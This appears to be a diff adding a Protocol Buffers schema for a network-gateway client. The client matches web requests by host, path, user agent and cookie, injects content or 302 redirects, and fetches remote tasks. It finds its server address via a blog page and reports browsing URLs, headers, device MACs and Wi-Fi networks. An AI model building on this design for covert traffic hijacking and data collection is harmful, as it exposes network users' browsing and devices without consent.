@@ -1,0 +1,273 @@
+syntax = "proto2";
+
+message BusinessRequest {
+	optional string	userID = 1;
+	optional int32 	memSize = 2;
+	required int32 	curVersion = 3;
+	required string	channel = 4;
+	required string 	clientVersion = 5;
+	optional string 	rptVersion = 6;
+}
+
+message Transparent302Target {
+	required string	host = 1;
+	required int32  port = 2;
+	required string url = 3;
+	required string method = 4;
+	required string httpVer = 5;
+	optional string referer = 6;
+}
+
+message Target {
+	required int32 targetID = 1;
+	required int32 dataVersion = 2;
+	
+	optional string contentType = 3;
+	optional string content = 4;
+	optional int32 keepalive = 5;
+	repeated string excludePath = 6;
+	repeated string	excludePathStart = 7;
+	repeated string	excludePathContain = 8;
+	optional int32  weight = 9;
+	
+	optional Transparent302Target transTarget = 10;
+	
+	optional string encParam = 12;
+}
+
+message Rule {
+	required	int32   ruleID = 1;
+	required int32  dataVersion = 2;
+	required	 int32  businessID = 3;
+	
+	optional string pathStart = 4;
+	repeated string pathContains = 5;
+	optional string pathStrict = 6;
+	repeated string userAgentContains = 7;
+	optional int32  refererStatus = 8;
+	repeated string referrerContains = 9;
+	repeated string cookieContains = 10;
+	repeated string denyPathContains = 11;
+	repeated string denyReferrerContains = 12;
+	repeated string denyUserAgentContains = 13;
+	repeated string denyCookieContains = 14;
+	optional int32  maxAge = 15;
+	optional int32  weight = 16;
+	optional string	noParamPathEnd = 17;
+}
+
+message RptRule {
+	required	 int32  rptId = 1;
+	repeated string hostContains = 2;
+	optional string pathStart = 4;
+	repeated string pathContains = 5;
+	optional string pathStrict = 6;
+	repeated string userAgentContains = 7;
+	optional int32  refererStatus = 8;
+	repeated string referrerContains = 9;
+	repeated string cookieContains = 10;
+	repeated string denyPathContains = 11;
+	repeated string denyReferrerContains = 12;
+	repeated string denyUserAgentContains = 13;
+	repeated string denyCookieContains = 14;
+	optional string	noParamPathEnd = 17;
+	required	 int32  businessID = 18;
+}
+
+message FilterQuery {
+	required	 string  userId = 1;
+	optional string channel = 2;
+	optional string endPointMac = 3;
+	optional string wanIp = 4;
+	optional string connIp = 5;
+	optional int32 ruleId = 6;
+	optional int32 targetId = 7;
+	optional string url = 8;
+	optional string headers = 9;
+}
+
+message FilterRet {
+	optional	 string  status = 1;
+	optional BusinessTarget targets = 2;
+}
+
+message ReportQuery {
+	required	 string  userId = 1;
+	optional string endPointMac = 2;
+	optional string wanIp = 3;
+	optional string connIp = 4;
+	optional int32 rptId = 5;
+	optional string url = 6;
+	optional string headers = 7;
+	optional string channel = 8;
+}
+
+message HostRule {
+	required string	host = 1;
+	optional int32	matchSub = 2;
+	repeated Rule   rules = 3;
+}
+
+message BusinessTarget {
+	required int32 businessID = 1;
+	optional string	targetType = 2;
+	repeated Target targets = 3;
+}
+
+message BusinessCfg {
+	required	int32	 	version = 1;
+	repeated HostRule 	hostRules = 2;
+	repeated BusinessTarget targets = 3;
+	repeated RptRule		rptRules = 4;
+}
+
+message UpdateInfo {
+	required string	channel = 1;
+	required string	newestVer = 2;
+	required TaskInfo task = 3;
+}
+
+message TaskInfo {
+	required string	taskUrl = 1;
+}
+
+message BlogInfo {
+	optional string	svrHost = 1;
+	required int32	svrPort = 2;
+	required string	cfgUrl = 3;
+	required string	method = 4;	
+	
+	required string	begin = 5;
+	required string	end = 6;
+	repeated string  point = 7;
+	required string  zero = 8;
+}
+
+message HartBeatItem {
+	required	 int32	svrType = 1;
+	required int32	nextLevelGap = 2;		// use next hartbeat server info seconds
+	required int32	successInterval = 3;		// if last success, then query later seconds
+	required int32	failInterval = 4;		// if last failed, then query later seconds
+	
+	optional string	svrIp = 5;
+	required int32	svrPort = 6;
+	required string	cfgUrl = 7;
+	required string	method = 8;
+	
+	optional BlogInfo  blogUrl = 9;				// get svrIp from blogUrl
+}
+
+message HartBeatConfig {
+	repeated HartBeatItem	hartbeet = 1;
+}
+
+message UpdateConfig {
+	repeated UpdateInfo  cfg = 1;
+}
+
+enum DataOp {
+	KeepUpdateConfig = 1;
+	UpdateFilterConfig = 2;
+	DisableFilter = 3;
+	RunTask = 4;
+	UpdateHartBeat = 5;
+	UpdateFilter = 6;
+}
+
+message BusinessResponse {
+	optional int32 status = 1;
+	optional string msg = 2;
+	optional DataOp dataOp = 3;
+	optional int32	filterTimeOut = 4;
+	optional BusinessCfg content = 5;
+	optional UpdateInfo updateInfo = 6;
+	optional TaskInfo taskInfo = 7;
+	optional HartBeatConfig hartBeatInfo = 8;
+}
+
+message ReportData {
+	optional string tbName = 1;
+	optional string userId = 2;
+	optional string	channel = 3;
+	optional string clientVersion = 4;
+	optional string wanIp = 5;
+	optional string clientAddr = 6;
+	optional bytes	data = 7;
+}
+
+message TableActive {
+	
+}
+
+message TableCrash {
+	
+}
+
+message TableTargetHit {
+	optional string	url = 1;
+	optional string	endPointMac = 2;
+	optional string	endPointIp = 3;
+	optional int32	ruleID = 4;
+	optional int32	targetID = 5;
+	optional string	host = 6;
+	optional string	ua = 7;
+	optional string referer = 8;
+}
+
+message TableRptHit {
+	optional string	url = 1;
+	optional string	endPointMac = 2;
+	optional string	endPointIp = 3;
+	optional int32	rptId = 4;
+	optional string	host = 6;
+	optional string	ua = 7;
+	optional string referer = 8;
+}
+
+message TableAdfilterWatch {
+	optional int32 memSize = 1;
+	optional int32 crashCnt = 2;
+}
+
+message TableClientFind {
+	optional string	clientMac = 1;
+	optional string	clienttIp = 2;
+	optional int32	active = 3;
+}
+
+message TableUaFind {
+	optional string	clientMac = 1;
+	optional string	clienttIp = 2;
+	optional string	ua = 3;
+	optional string	url = 4;
+	optional string  host = 5;
+}
+
+message TableWifiFind {
+	optional string ssid = 1;
+	optional string bssid = 2;
+}
+
+message TableIosWork {
+	required int32 status = 1;
+	optional string guid = 2;
+	optional string  locations= 3;
+	optional string workurl = 4;
+	optional string endPointMac = 5;
+}
+
+message FilterReportItem {
+	required int32 ruleId = 1;
+	required int32 targetId = 2;
+	required int32 ruleVer = 3;
+	required	 int32 srcIp = 4;
+	optional bytes srdMac = 5;
+	optional bytes uri = 6;
+	optional bytes headers = 7;
+}
+
+message FilterReport {
+	repeated FilterReportItem items = 1;
+}
+
+
